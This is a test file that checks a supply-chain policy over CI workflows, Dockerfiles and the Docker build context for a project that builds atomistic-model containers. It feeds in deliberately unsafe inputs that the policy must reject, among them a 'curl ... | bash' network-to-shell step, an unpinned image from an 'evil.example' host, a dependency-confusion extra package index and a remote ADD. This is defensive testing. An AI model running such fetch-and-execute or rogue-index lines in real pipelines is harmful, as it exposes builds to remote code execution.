import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { dump as dumpYaml, load as parseYaml } from 'js-yaml';
import { describe, expect, it } from 'vitest';
import {
  ATOMISTIC_DOCKERFILE_DIGESTS,
  ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST,
  ATOMISTIC_BOOTSTRAP_BASE_IMAGE,
  ATOMISTIC_BOOTSTRAP_NODE_VERSION,
  ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256,
  ATOMISTIC_RUNTIME_INVENTORY_VERIFIER_SHA256,
  ATOMISTIC_BOOTSTRAP_PYPI_INDEX,
  ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX,
  ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
  DOCKERIGNORE_ALLOWLIST,
  inspectDockerfileSource,
  inspectDockerignoreSource,
  inspectWorkflowSource,
  PINNED_DOCKERFILE_FRONTEND,
  PYTHON_HOSTLIST_BUILD_LOCK_SHA256,
  PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256,
  PYTHON_HOSTLIST_SDIST_SHA256,
  PYTHON_HOSTLIST_SDIST_URL,
  PYTHON_HOSTLIST_VERIFIER_SHA256,
  SENTINEL_EVALUATION_WORKFLOW_PATH,
  SENTINEL_REPORT_WORKFLOW_PATH,
  SETUPTOOLS_RUNTIME_WHEEL_FILENAME,
  SETUPTOOLS_RUNTIME_WHEEL_SHA256,
  SETUPTOOLS_STARTUP_HOOK_SHA256,
} from './workflow-policy.mjs';

const atomisticBootstrapSource = readFileSync(
  new URL('../.github/workflows/atomistic-bootstrap.yml', import.meta.url),
  'utf8',
);
const checkedInDockerignoreSource = readFileSync(
  new URL('../.dockerignore', import.meta.url),
  'utf8',
);
const sentinelEvaluationSource = readFileSync(
  new URL('../.github/workflows/evaluate.yml', import.meta.url),
  'utf8',
);
const sentinelReportSource = readFileSync(
  new URL('../.github/workflows/sentinel-report.yml', import.meta.url),
  'utf8',
);
const pythonHostlistBuildLockSource = readFileSync(
  new URL('../atomistic/locks/python-hostlist-build.requirements.lock', import.meta.url),
);
const pythonHostlistBuildScriptSource = readFileSync(
  new URL('./atomistic/build_python_hostlist_wheel.sh', import.meta.url),
);
const pythonHostlistVerifierSource = readFileSync(
  new URL('./atomistic/verify_derived_wheel.py', import.meta.url),
);
const atomisticResolveLockSource = readFileSync(
  new URL('./atomistic/resolve_lock.py', import.meta.url),
  'utf8',
);
const runtimeInventoryVerifierSource = readFileSync(
  new URL('./atomistic/verify_runtime_inventory.py', import.meta.url),
);
const matterSimBootstrapInput = readFileSync(
  new URL('../atomistic/locks/mattersim.bootstrap.in', import.meta.url),
  'utf8',
);
const maceBootstrapInput = readFileSync(
  new URL('../atomistic/locks/mace.bootstrap.in', import.meta.url),
  'utf8',
);
const matterSimDockerfileSource = readFileSync(
  new URL('../atomistic/containers/mattersim.Dockerfile', import.meta.url),
  'utf8',
);
const maceDockerfileSource = readFileSync(
  new URL('../atomistic/containers/mace.Dockerfile', import.meta.url),
  'utf8',
);
const bootstrapOutcomeSource = readFileSync(
  new URL('./atomistic/write_bootstrap_outcome.py', import.meta.url),
);
const sentinelEvaluationWorkflow = parseYaml(sentinelEvaluationSource);
const sentinelReportWorkflow = parseYaml(sentinelReportSource);

function inspectMutatedBootstrap(mutator) {
  const workflow = parseYaml(atomisticBootstrapSource);
  mutator(workflow);
  return inspectWorkflowSource(
    ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
    dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
  );
}

function namedStep(workflow, name) {
  const matches = workflow.jobs.bootstrap.steps.filter((step) => step.name === name);
  if (matches.length !== 1) throw new Error(`expected one bootstrap step named ${name}`);
  return matches[0];
}

describe('workflow source policy', () => {
  it('accepts full action and OCI pins plus credential-free checkout', () => {
    const source = `on: [push]\njobs:\n  test:\n    container: node@sha256:${'b'.repeat(64)}\n    services:\n      db:\n        image: postgres@sha256:${'c'.repeat(64)}\n    steps:\n      - uses: actions/checkout@${'a'.repeat(40)} # v4\n        with:\n          persist-credentials: false\n      - uses: docker://example/tool@sha256:${'d'.repeat(64)}\n      - uses: ./local-action\n`;
    expect(inspectWorkflowSource('safe.yml', source)).toEqual([]);
  });

  it('rejects mutable refs, images, pull_request_target, credentials and network-to-shell', () => {
    const failures = inspectWorkflowSource('unsafe.yml', `on:\n  pull_request_target:\njobs:\n  x:\n    container: ubuntu:latest\n    services:\n      db:\n        image: postgres:latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: docker://evil.example/tool:latest\n      - run: curl https://example.invalid/x | bash\n`);
    expect(failures).toHaveLength(7);
    expect(failures.join('\n')).toMatch(/Docker action.*not pinned/);
  });

  it('rejects duplicate YAML keys instead of accepting last-wins parsing', () => {
    expect(inspectWorkflowSource('duplicate.yml', 'on: push\non: pull_request\njobs: {}').join('\n')).toMatch(/duplicate keys/);
  });

  it('keeps candidate evaluation read-only and moves PR writes to the default-branch workflow_run reporter', () => {
    expect(inspectWorkflowSource(SENTINEL_EVALUATION_WORKFLOW_PATH, sentinelEvaluationSource)).toEqual([]);
    expect(inspectWorkflowSource(SENTINEL_REPORT_WORKFLOW_PATH, sentinelReportSource)).toEqual([]);
    expect(sentinelEvaluationWorkflow.permissions).toEqual({ contents: 'read' });
    expect(Object.keys(sentinelEvaluationWorkflow.jobs)).toEqual(['evaluate']);
    expect(sentinelEvaluationWorkflow.jobs.evaluate.permissions).toEqual({ contents: 'read' });
    expect(sentinelEvaluationWorkflow.jobs.evaluate['runs-on']).toBe('ubuntu-24.04');
    expect(sentinelReportWorkflow.on).toEqual({
      workflow_run: {
        workflows: ['Tailing Sentinel'],
        types: ['completed'],
      },
    });
    expect(sentinelReportWorkflow.permissions).toEqual({
      actions: 'read',
      'pull-requests': 'write',
    });
    expect(sentinelReportWorkflow.jobs.report.permissions).toEqual({
      actions: 'read',
      'pull-requests': 'write',
    });
    expect(sentinelReportWorkflow.jobs.report['runs-on']).toBe('ubuntu-24.04');
    expect(sentinelReportWorkflow.jobs.report.steps.some((step) => step.run
      || String(step.uses ?? '').startsWith('actions/checkout@')
      || String(step.uses ?? '').startsWith('./'))).toBe(false);
    expect(sentinelReportWorkflow.jobs.report.steps.every((step) =>
      /^actions\/github-script@[0-9a-f]{40}$/.test(step.uses))).toBe(true);
    for (const stepId of ['build', 'report_build']) {
      const buildStep = sentinelEvaluationWorkflow.jobs.evaluate.steps.find((step) => step.id === stepId);
      expect(buildStep?.env).toEqual({
        NEXT_PUBLIC_TAILING_COMMIT_SHA: '${{ github.sha }}',
      });
    }
  });

  it('rejects every candidate-workflow attempt to acquire write authority', () => {
    const cases = [
      ['top-level pull-request write', (workflow) => { workflow.permissions['pull-requests'] = 'write'; }],
      ['evaluate-job pull-request write', (workflow) => { workflow.jobs.evaluate.permissions['pull-requests'] = 'write'; }],
      ['OIDC write', (workflow) => { workflow.jobs.evaluate.permissions['id-token'] = 'write'; }],
      ['privileged sibling job', (workflow) => {
        workflow.jobs.report = {
          permissions: { 'pull-requests': 'write' },
          'runs-on': 'ubuntu-24.04',
          steps: [],
        };
      }],
      ['target-context trigger', (workflow) => { workflow.on = { pull_request_target: null }; }],
    ];
    for (const [label, mutate] of cases) {
      const workflow = parseYaml(sentinelEvaluationSource);
      mutate(workflow);
      expect(inspectWorkflowSource(
        SENTINEL_EVALUATION_WORKFLOW_PATH,
        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
      ), label).not.toEqual([]);
    }
  });

  it('rejects reporter trust-binding, bounded-data, and no-candidate-execution drift', () => {
    const cases = [
      ['source workflow name', (workflow) => { workflow.on.workflow_run.workflows = ['Candidate Sentinel']; }],
      ['write scope expansion', (workflow) => { workflow.permissions.contents = 'write'; }],
      ['mutable runner', (workflow) => { workflow.jobs.report['runs-on'] = 'ubuntu-latest'; }],
      ['candidate checkout', (workflow) => {
        workflow.jobs.report.steps.splice(1, 0, {
          name: 'Checkout candidate',
          uses: `actions/checkout@${'a'.repeat(40)}`,
          with: { ref: '${{ github.event.workflow_run.head_sha }}', 'persist-credentials': false },
        });
      }],
      ['candidate shell', (workflow) => {
        workflow.jobs.report.steps.push({ name: 'Run candidate', run: 'node candidate.mjs' });
      }],
      ['workflow id drift', (workflow) => {
        workflow.jobs.report.steps[0].env.EXPECTED_WORKFLOW_ID = '1';
      }],
      ['repository id drift', (workflow) => {
        workflow.jobs.report.steps[0].env.EXPECTED_REPOSITORY_ID = '1';
      }],
      ['artifact size expansion', (workflow) => {
        workflow.jobs.report.steps[1].env.MAX_ARTIFACT_ARCHIVE_BYTES = '1073741824';
      }],
      ['report size expansion', (workflow) => {
        workflow.jobs.report.steps[1].env.MAX_REPORT_BYTES = '1073741824';
      }],
      ['artifact-name validation removal', (workflow) => {
        workflow.jobs.report.steps[0].with.script = workflow.jobs.report.steps[0].with.script
          .replace("assert(matches.length === 1, 'expected report artifact name must resolve exactly once');", '');
      }],
      ['mention neutralization removal', (workflow) => {
        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
          .replace(".replaceAll('@', '@\\u200b');", ".replaceAll('@', '@');");
      }],
      ['ZIP expansion guard removal', (workflow) => {
        workflow.jobs.report.steps[1].with.script = workflow.jobs.report.steps[1].with.script
          .replace('expandedSize > 0 && expandedSize <= maxReportBytes', 'expandedSize > 0');
      }],
    ];
    for (const [label, mutate] of cases) {
      const workflow = parseYaml(sentinelReportSource);
      mutate(workflow);
      expect(inspectWorkflowSource(
        SENTINEL_REPORT_WORKFLOW_PATH,
        dumpYaml(workflow, { lineWidth: -1, noRefs: true }),
      ), label).not.toEqual([]);
    }
  });

  it('compiles both reviewed reporter programs as asynchronous JavaScript', () => {
    const AsyncFunction = Object.getPrototypeOf(async function noop() {}).constructor;
    for (const step of sentinelReportWorkflow.jobs.report.steps) {
      expect(() => new AsyncFunction('github', 'context', 'core', 'require', step.with.script)).not.toThrow();
    }
  });
});

describe('Dockerfile source policy', () => {
  it('accepts the pinned frontend, required base argument and named wheelhouse context', () => {
    const source = `# syntax=${PINNED_DOCKERFILE_FRONTEND}\nARG BASE_IMAGE\nFROM \${BASE_IMAGE} AS builder\nCOPY --from=wheelhouse / /wheelhouse/\nFROM \${BASE_IMAGE} AS runtime\nCOPY --from=builder /opt/venv /opt/venv\n`;
    expect(inspectDockerfileSource('safe.Dockerfile', source)).toEqual([]);
  });

  it('rejects a mutable frontend, default base, external COPY, networked RUN, secrets and remote ADD', () => {
    const source = '# syntax=docker/dockerfile:1.7\nARG BASE_IMAGE=python:latest\nFROM python:latest AS runtime\nCOPY --from=evil:latest /x /x\nRUN --mount=type=secret pip check\nADD https://example.invalid/x /x\n';
    expect(inspectDockerfileSource('unsafe.Dockerfile', source)).toHaveLength(7);
  });

  it('requires both atomistic images to remove the reviewed setuptools startup hook', () => {
    for (const [relativePath, source] of [
      ['atomistic/containers/mattersim.Dockerfile', matterSimDockerfileSource],
      ['atomistic/containers/mace.Dockerfile', maceDockerfileSource],
    ]) {
      expect(inspectDockerfileSource(relativePath, source), relativePath).toEqual([]);
      expect(
        inspectDockerfileSource(relativePath, source.replace('rm -- "$startup_hook"', ':')),
        `${relativePath} without removal`,
      ).not.toEqual([]);
      const reordered = source
        .replace('    /opt/tailing-venv/bin/python -I -m pip check\n', '    true\n')
        .replace(
          '    rm -- "$startup_hook" && \\\n',
          '    /opt/tailing-venv/bin/python -I -m pip check && \\\n    rm -- "$startup_hook" && \\\n',
        );
      expect(reordered).not.toBe(source);
      expect(inspectDockerfileSource(relativePath, reordered), `${relativePath} reordered`).not.toEqual([]);
      expect(ATOMISTIC_DOCKERFILE_DIGESTS[relativePath]).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });
});

describe('Docker build-context policy', () => {
  it('accepts only the exact deny-all atomistic allowlist', () => {
    const safe = `${DOCKERIGNORE_ALLOWLIST.join('\n')}\n`;
    expect(checkedInDockerignoreSource).toBe(safe);
    expect(inspectDockerignoreSource('.dockerignore', checkedInDockerignoreSource)).toEqual([]);
    expect(inspectDockerignoreSource('.dockerignore', safe)).toEqual([]);
    expect(inspectDockerignoreSource('.dockerignore', `${safe}!.env\n`).join('\n')).toMatch(/exact deny-all allowlist/);
    expect(inspectDockerignoreSource('.dockerignore', safe.replace('**\n', '')).join('\n')).toMatch(/exact deny-all allowlist/);
  });
});

describe('atomistic bootstrap supply-chain policy', () => {
  it('accepts the checked-in manual dual-model non-promotional workflow', () => {
    expect(inspectWorkflowSource(ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH, atomisticBootstrapSource)).toEqual([]);
    expect(ATOMISTIC_BOOTSTRAP_NODE_VERSION).toBe('24.16.0');
    expect(ATOMISTIC_BOOTSTRAP_BASE_IMAGE).toMatch(/^python:3\.12\.13-slim-bookworm@sha256:[0-9a-f]{64}$/);
    expect(ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(PYTHON_HOSTLIST_SDIST_URL).toMatch(/^https:\/\/files\.pythonhosted\.org\//);
    expect(PYTHON_HOSTLIST_SDIST_SHA256).toMatch(/^[0-9a-f]{64}$/);
    expect(createHash('sha256').update(pythonHostlistBuildLockSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_LOCK_SHA256);
    expect(createHash('sha256').update(pythonHostlistBuildScriptSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256);
    expect(createHash('sha256').update(pythonHostlistVerifierSource).digest('hex')).toBe(PYTHON_HOSTLIST_VERIFIER_SHA256);
    expect(createHash('sha256').update(bootstrapOutcomeSource).digest('hex')).toBe(ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256);
    expect(createHash('sha256').update(runtimeInventoryVerifierSource).digest('hex')).toBe(ATOMISTIC_RUNTIME_INVENTORY_VERIFIER_SHA256);
    expect(atomisticResolveLockSource).toContain(
      `PYTHON_HOSTLIST_BUILD_TOOL_LOCK_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_LOCK_SHA256}"`,
    );
    expect(atomisticResolveLockSource).toContain(
      `PYTHON_HOSTLIST_BUILD_SCRIPT_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256}"`,
    );
    expect(atomisticResolveLockSource).toContain(`"filename": "${SETUPTOOLS_RUNTIME_WHEEL_FILENAME}"`);
    expect(atomisticResolveLockSource).toContain(`"sha256": "sha256:${SETUPTOOLS_RUNTIME_WHEEL_SHA256}"`);
    expect(atomisticResolveLockSource).toContain(`"sha256": "sha256:${SETUPTOOLS_STARTUP_HOOK_SHA256}"`);
    expect(maceBootstrapInput).toMatch(/^setuptools==84\.0\.0$/m);
    expect(matterSimBootstrapInput).toMatch(/^setuptools==84\.0\.0$/m);
    expect(matterSimBootstrapInput).toMatch(/^pymatgen==2025\.4\.17$/m);
    expect(matterSimBootstrapInput).toMatch(/^pymatgen-io-validation==0\.1\.2$/m);
  });

  it('keeps cold-install hook globs literal inside the nested single-quoted shell', () => {
    const workflow = parseYaml(atomisticBootstrapSource);
    const coldInstall = namedStep(workflow, 'Prove a cold, hash-locked install with no network').run;
    expect(coldInstall).toContain("sh -euc '");
    expect(coldInstall).toContain('-iname \\*.pth');
    expect(coldInstall).toContain('-iname sitecustomize.\\*');
    expect(coldInstall).toContain('unexpected_hooks="$(find');
    expect(coldInstall).not.toContain("-iname '*.pth'");
  });

  it('runs the independent inventory verifier without local or site import shadowing', () => {
    const workflow = parseYaml(atomisticBootstrapSource);
    for (const stepName of [
      'Freeze and verify the exact resolved wheel set',
      'Build the isolated runtime image with no build-step network',
    ]) {
      const run = namedStep(workflow, stepName).run;
      expect(run, stepName).toContain('python3 -I -S -B scripts/atomistic/verify_runtime_inventory.py');
      expect(run, stepName).not.toMatch(/python3\s+-B\s+scripts\/atomistic\/verify_runtime_inventory\.py/);
    }
  });

  it('rejects trigger, main guard, runtime, architecture and model-isolation drift', () => {
    const cases = [
      ['push trigger', (workflow) => { workflow.on = { push: null }; }],
      ['workflow input override', (workflow) => { workflow.on.workflow_dispatch = { inputs: { plan: { required: false } } }; }],
      ['non-main guard', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace('refs/heads/main', 'refs/heads/review');
      }],
      ['mutable Node runtime', (workflow) => {
        namedStep(workflow, 'Install the pinned JavaScript runtime').with['node-version'] = '24';
      }],
      ['base image drift', (workflow) => { workflow.env.BASE_IMAGE = `python:3.12.13@sha256:${'1'.repeat(64)}`; }],
      ['base platform digest drift', (workflow) => { workflow.env.BASE_IMAGE_AMD64_DIGEST = `sha256:${'2'.repeat(64)}`; }],
      ['frontend drift', (workflow) => { workflow.env.DOCKERFILE_FRONTEND = `docker/dockerfile:1.7@sha256:${'3'.repeat(64)}`; }],
      ['runner OS drift', (workflow) => { workflow.jobs.bootstrap['runs-on'] = 'macos-14'; }],
      ['joint model execution', (workflow) => { workflow.jobs.bootstrap.strategy.matrix.model = ['mattersim-and-mace']; }],
      ['publish root drift', (workflow) => {
        const step = namedStep(workflow, 'Create fresh, model-isolated working directories');
        step.run = step.run.replace(
          'publish_dir="$RUNNER_TEMP/tailing-atomistic-publish/$MODEL"',
          'publish_dir="/tmp/unreviewed"',
        );
      }],
      ['publish directory creation drift', (workflow) => {
        const step = namedStep(workflow, 'Create fresh, model-isolated working directories');
        step.run = step.run.replace(
          '"$output_dir" "$publish_dir"',
          '"$output_dir" "$PUBLISH_DIR"',
        );
      }],
      ['unreviewed job key', (workflow) => { workflow.jobs.bootstrap.container = ATOMISTIC_BOOTSTRAP_BASE_IMAGE; }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });

  it('rejects alternate package sources and any networked resolve, cold-install, build or checkpoint run', () => {
    const cases = [
      ['alternate PyTorch source', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX, 'https://pypi.example.invalid/simple');
      }],
      ['alternate remaining-dependency source', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYPI_INDEX, 'https://mirror.example.invalid/simple');
      }],
      ['dependency-confusion extra index', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run += '\npython -m pip download --extra-index-url https://evil.example.invalid/simple torch\n';
      }],
      ['cached dependency downloads', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace('--no-cache-dir', '--cache-dir=/tmp/pip-cache');
      }],
      ['expanded dependency tmpfs', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace('size=1g,mode=1777', 'size=8g,mode=1777');
      }],
      ['python-hostlist sdist drift', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(PYTHON_HOSTLIST_SDIST_SHA256, 'f'.repeat(64));
      }],
      ['networked source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        const start = step.run.indexOf('for derived_output in');
        const suffix = step.run.slice(start).replace('--network=none', '--network=bridge');
        step.run = step.run.slice(0, start) + suffix;
      }],
      ['workspace mounted into source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(
          '--mount "type=bind,src=$SOURCE_BUILD_INPUTS,dst=/inputs,readonly"',
          '--mount "type=bind,src=$GITHUB_WORKSPACE,dst=/repo,readonly"',
        );
      }],
      ['derived provenance omitted from offline resolver', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace(
          'derived_arguments=(--derived-wheel-manifest /manifests/python-hostlist.derived-wheel.manifest.json)',
          'derived_arguments=()',
        );
      }],
      ['networked lock resolution', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['networked cold install', (workflow) => {
        const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['networked image build', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--network=none', '--network=default');
      }],
      ['networked checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['non-amd64 checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--platform=linux/amd64', '--platform=linux/arm64');
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });

  it('rejects broader artifacts, full runs, metrics, receipts and attestations', () => {
    const cases = [
      ['promotional artifact name', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.name = 'tailing-atomistic-full-${{ github.sha }}';
      }],
      ['whole-workspace upload', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.path = '${{ github.workspace }}/';
      }],
      ['unguarded upload after failed staging', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').if = 'always()';
      }],
      ['full checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--mode smoke', '--mode full');
      }],
      ['checkpoint publication', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run += '\ninstall -m 0444 "$CACHE_ROOT/$CHECKPOINT_CACHE_PATH" "$PUBLISH_DIR/checkpoint.model"\n';
      }],
      ['forged outcome stage', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.env.STAGE_INFERENCE = '${{ steps.build.outcome }}';
      }],
      ['forged intermediate outcome mapping', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace(
          '--stage "resolve=$STAGE_RESOLVE"',
          '--stage "resolve=$STAGE_FREEZE"',
        );
      }],
      ['outcome manifest omitted', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace('python -B scripts/atomistic/write_bootstrap_outcome.py', 'true');
      }],
      ['metrics side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Compute metrics', shell: 'bash', run: 'node compute-metrics.mjs' });
      }],
      ['receipt side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Create receipt', shell: 'bash', run: 'node create-receipt.mjs' });
      }],
      ['attestation side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Attest', uses: `actions/attest-build-provenance@${'a'.repeat(40)}` });
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });
});
